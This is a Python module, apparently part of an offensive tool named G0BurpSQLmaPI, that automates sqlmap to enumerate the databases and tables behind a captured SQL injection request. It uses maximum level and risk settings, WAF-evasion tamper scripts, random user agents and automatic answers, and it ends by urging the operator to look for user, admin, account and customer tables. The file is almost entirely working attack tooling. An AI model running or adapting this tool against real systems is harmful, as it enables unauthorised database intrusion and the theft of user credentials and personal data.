#!/usr/bin/env python3
"""
G0BurpSQLmaPI - Tables Discovery Module
Scans for REAL databases and tables - DISCOVERY ONLY
Filters out test/empty databases
Author: nu11secur1ty
License: GPL-3.0
"""

import os
import sys
import json
import time
import shutil
import subprocess
import re
from pathlib import Path
from datetime import datetime

try:
    from colorama import init, Fore, Style
    init(autoreset=True, convert=True)
except Exception:
    class _C:
        def __getattr__(self, _): return ""
    Fore = Style = _C()

# ============================================================================
# PATHS
# ============================================================================

ROOT = Path.cwd()
MODULES_DIR = ROOT / "modules"
EXPLOIT_PATH = MODULES_DIR / "exploit.txt"
META_PATH = MODULES_DIR / "exploit_meta.json"
OUTPUT_DIR = ROOT / "tables_discovery"

OUTPUT_DIR.mkdir(exist_ok=True)

# SQLMap configuration
SQLMAP_ENV_VAR = "G0_SQLMAP_PATH"
SQLMAP_DEFAULT_PATHS = [
    "D:/CVE/sqlmap-nu11secur1ty/sqlmap.py",
    "/usr/bin/sqlmap",
    "/usr/local/bin/sqlmap",
    "sqlmap.py",
]

# ============================================================================
# YOUR TECHNIQUES - RISK LEVEL, TAMPERS, ETC
# ============================================================================

SQLMAP_LEVEL = "5"
SQLMAP_RISK = "3"
SQLMAP_TIME_SEC = "11"
SQLMAP_TAMPERS = "space2comment,between,charencode"
SQLMAP_NO_CAST = "--no-cast"
SQLMAP_NO_ESCAPE = "--no-escape"
SQLMAP_RANDOM_AGENT = "--random-agent"
SQLMAP_FLUSH_SESSION = "--flush-session"
SQLMAP_THREADS = "10"
SQLMAP_TIMEOUT = "30"
SQLMAP_RETRIES = "3"

# SQLMAP ANSWERS
SQLMAP_ANSWERS = "continue=Y,quit=N,proceed=Y,crack=Y,dict=Y,resolve=Y,follow=Y,test=Y"

# ============================================================================
# FUNCTIONS
# ============================================================================

def display_banner():
    """Display module banner"""
    print(Fore.CYAN + """
╔═══════════════════════════════════════════════════════════════╗
║                    TABLES DISCOVERY MODULE                    ║
║           SCANS REAL DATABASES AND TABLES - NO DUMP          ║
║                   Author: nu11secur1ty                        ║
╚═══════════════════════════════════════════════════════════════╝
""" + Style.RESET_ALL)

def find_sqlmap():
    """Find sqlmap installation"""
    env_path = os.getenv(SQLMAP_ENV_VAR)
    if env_path:
        p = Path(env_path)
        if p.exists():
            return str(p)
    
    for path in SQLMAP_DEFAULT_PATHS:
        if Path(path).exists():
            return path
    
    for candidate in ("sqlmap.py", "sqlmap"):
        found = shutil.which(candidate)
        if found:
            return found
    return None

def load_exploit():
    """Load exploit file and parameters"""
    if not EXPLOIT_PATH.exists():
        print(Fore.RED + "ERROR: exploit.txt not found! Generate PoC first." + Style.RESET_ALL)
        return None, None
    
    try:
        vuln_params = []
        if META_PATH.exists():
            with open(META_PATH, 'r') as f:
                meta = json.load(f)
                vuln_params = meta.get("vuln_params", [])
        return EXPLOIT_PATH, vuln_params
    except Exception as e:
        print(Fore.RED + f"Error loading exploit: {e}" + Style.RESET_ALL)
        return None, None

def get_base_cmd(sqlmap_path, exploit_path, vuln_params):
    """Build base sqlmap command with YOUR TECHNIQUES"""
    if sqlmap_path.endswith(".py"):
        cmd = [sys.executable, sqlmap_path]
    else:
        cmd = [sqlmap_path]
    
    cmd += [
        "-r", str(exploit_path),
        f"--level={SQLMAP_LEVEL}",
        f"--risk={SQLMAP_RISK}",
        f"--time-sec={SQLMAP_TIME_SEC}",
        f"--tamper={SQLMAP_TAMPERS}",
        SQLMAP_NO_CAST,
        SQLMAP_NO_ESCAPE,
        SQLMAP_RANDOM_AGENT,
        SQLMAP_FLUSH_SESSION,
        f"--threads={SQLMAP_THREADS}",
        f"--timeout={SQLMAP_TIMEOUT}",
        f"--retries={SQLMAP_RETRIES}",
        "--batch",
        f"--answers={SQLMAP_ANSWERS}",
    ]
    
    if vuln_params:
        cmd += ["-p", ",".join(vuln_params)]
    
    return cmd

def run_sqlmap_command(cmd, description=""):
    """Run sqlmap and capture output"""
    if description:
        print(Fore.CYAN + f"\n[+] {description}" + Style.RESET_ALL)
    
    print(Fore.YELLOW + "[*] Running sqlmap with your techniques..." + Style.RESET_ALL)
    print("-" * 60)
    
    try:
        # Run sqlmap directly - shows colors
        result = subprocess.run(cmd, check=False)
        
        # Capture output for parsing
        cmd_capture = cmd.copy()
        capture_result = subprocess.run(cmd_capture, capture_output=True, text=True, check=False)
        output = capture_result.stdout + capture_result.stderr
        
        return output
        
    except Exception as e:
        print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
        return ""

def get_real_databases(sqlmap_path, exploit_path, vuln_params):
    """Get REAL databases - filter out system and test databases"""
    print(Fore.CYAN + "\n[+] Getting REAL databases..." + Style.RESET_ALL)
    
    cmd = get_base_cmd(sqlmap_path, exploit_path, vuln_params)
    cmd.append("--dbs")
    
    output = run_sqlmap_command(cmd, "Scanning for databases")
    
    if not output:
        return []
    
    # Blacklist - databases to ignore (NO starting/ending)
    blacklist = [
        'information_schema', 'performance_schema', 'mysql', 'sys', 'phpmyadmin'
    ]
    
    databases = []
    for line in output.split('\n'):
        match = re.search(r'\[\*\]\s+(\w+)', line)
        if match:
            db = match.group(1)
            if db.lower() not in blacklist:
                databases.append(db)
    
    return databases

def get_real_tables(sqlmap_path, exploit_path, vuln_params, database):
    """Get REAL tables from a database - filter out empty ones"""
    print(Fore.CYAN + f"[*] Getting tables from: {database}" + Style.RESET_ALL)
    
    cmd = get_base_cmd(sqlmap_path, exploit_path, vuln_params)
    cmd += ["-D", database, "--tables"]
    
    output = run_sqlmap_command(cmd, f"Scanning {database}")
    
    if not output:
        return []
    
    # Check if database is empty
    if "appears to be empty" in output:
        print(Fore.YELLOW + f"[!] Database '{database}' appears to be empty" + Style.RESET_ALL)
        return []
    
    tables = []
    for line in output.split('\n'):
        # Look for table names
        match = re.search(r'\|+\s*(\w+)\s*\|+', line)
        if match:
            table = match.group(1)
            if table and len(table) > 1 and table not in ['Table', '---', 'tables']:
                tables.append(table)
        
        match = re.search(r'\[\*\]\s+(\w+)', line)
        if match:
            table = match.group(1)
            if table and len(table) > 1:
                tables.append(table)
    
    return list(set(tables))

def save_results(all_data, databases_count, total_tables):
    """Save results to JSON and TXT files"""
    # Save JSON
    json_file = OUTPUT_DIR / "tables_scan.json"
    with open(json_file, 'w', encoding='utf-8') as f:
        json.dump(all_data, f, indent=2)
    
    print(Fore.GREEN + f"\n[+] JSON saved to: {json_file}" + Style.RESET_ALL)
    
    # Save TXT
    txt_file = OUTPUT_DIR / "tables_scan.txt"
    with open(txt_file, 'w', encoding='utf-8') as f:
        f.write("="*60 + "\n")
        f.write("TABLES DISCOVERY RESULTS\n")
        f.write(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("="*60 + "\n\n")
        
        f.write(f"[Summary]\n")
        f.write(f"  Databases found: {databases_count}\n")
        f.write(f"  Tables found: {total_tables}\n\n")
        
        for db, tables in all_data.items():
            if tables:
                f.write(f"\n[Database] {db}\n")
                f.write(f"[Tables] {len(tables)}\n")
                f.write("-"*40 + "\n")
                for table in tables:
                    f.write(f"  - {table}\n")
    
    print(Fore.GREEN + f"[+] TXT saved to: {txt_file}" + Style.RESET_ALL)

def run_tables_discovery():
    """Main function - discover REAL databases and tables"""
    display_banner()
    
    # Check if exploit exists
    if not EXPLOIT_PATH.exists():
        print(Fore.RED + "ERROR: exploit.txt not found!" + Style.RESET_ALL)
        print(Fore.YELLOW + "Please generate PoC first using option 1 from main menu." + Style.RESET_ALL)
        input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
        return
    
    # Find sqlmap
    sqlmap_path = find_sqlmap()
    if not sqlmap_path:
        print(Fore.RED + "ERROR: sqlmap not found!" + Style.RESET_ALL)
        input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
        return
    
    # Load exploit
    exploit_path, vuln_params = load_exploit()
    if not exploit_path:
        input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
        return
    
    # Show configuration
    print(Fore.CYAN + "\n[*] Configuration:" + Style.RESET_ALL)
    print(f"    SQLMap: {sqlmap_path}")
    print(f"    Exploit: {exploit_path}")
    print(f"    Level: {SQLMAP_LEVEL}")
    print(f"    Risk: {SQLMAP_RISK}")
    print(f"    Time-Sec: {SQLMAP_TIME_SEC}")
    print(f"    Tamper: {SQLMAP_TAMPERS}")
    if vuln_params:
        print(f"    Parameters: {vuln_params}")
    print()
    
    # Confirm
    confirm = input(Fore.YELLOW + "Start REAL TABLES DISCOVERY (no dump)? [Y/n]: " + Style.RESET_ALL).strip().lower()
    if confirm not in ("", "y", "yes"):
        print(Fore.YELLOW + "Cancelled." + Style.RESET_ALL)
        input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
        return
    
    # STEP 1: Get REAL databases
    databases = get_real_databases(sqlmap_path, exploit_path, vuln_params)
    
    if not databases:
        print(Fore.RED + "No databases found!" + Style.RESET_ALL)
        input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
        return
    
    # Show databases
    print(Fore.GREEN + f"\n[+] Found {len(databases)} databases:" + Style.RESET_ALL)
    for i, db in enumerate(databases, 1):
        print(f"    {i}. {db}")
    
    # STEP 2: Get tables from each database
    print(Fore.CYAN + "\n[+] Scanning tables..." + Style.RESET_ALL)
    print("="*60)
    
    all_data = {}
    total_tables = 0
    
    for db in databases:
        tables = get_real_tables(sqlmap_path, exploit_path, vuln_params, db)
        
        if tables:
            all_data[db] = tables
            total_tables += len(tables)
            print(Fore.GREEN + f"[+] {db}: {len(tables)} tables" + Style.RESET_ALL)
            for table in tables:
                print(Fore.CYAN + f"    - {table}" + Style.RESET_ALL)
        else:
            all_data[db] = []
            print(Fore.YELLOW + f"[!] {db}: No tables found" + Style.RESET_ALL)
    
    # Summary
    print(Fore.CYAN + "\n" + "="*60)
    print("DISCOVERY COMPLETE")
    print("="*60 + Style.RESET_ALL)
    print(Fore.GREEN + f"[+] Databases discovered: {len(databases)}" + Style.RESET_ALL)
    print(Fore.GREEN + f"[+] Tables discovered: {total_tables}" + Style.RESET_ALL)
    
    # Save results
    save_results(all_data, len(databases), total_tables)
    
    print(Fore.CYAN + "\nTIP: Update Users.py with these table names:" + Style.RESET_ALL)
    print(Fore.YELLOW + "Look for: users, admins, members, login, accounts, profiles, customers, employees, auth, roles" + Style.RESET_ALL)
    
    input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)

# ============================================================================
# MAIN ENTRYPOINT
# ============================================================================

if __name__ == "__main__":
    run_tables_discovery()
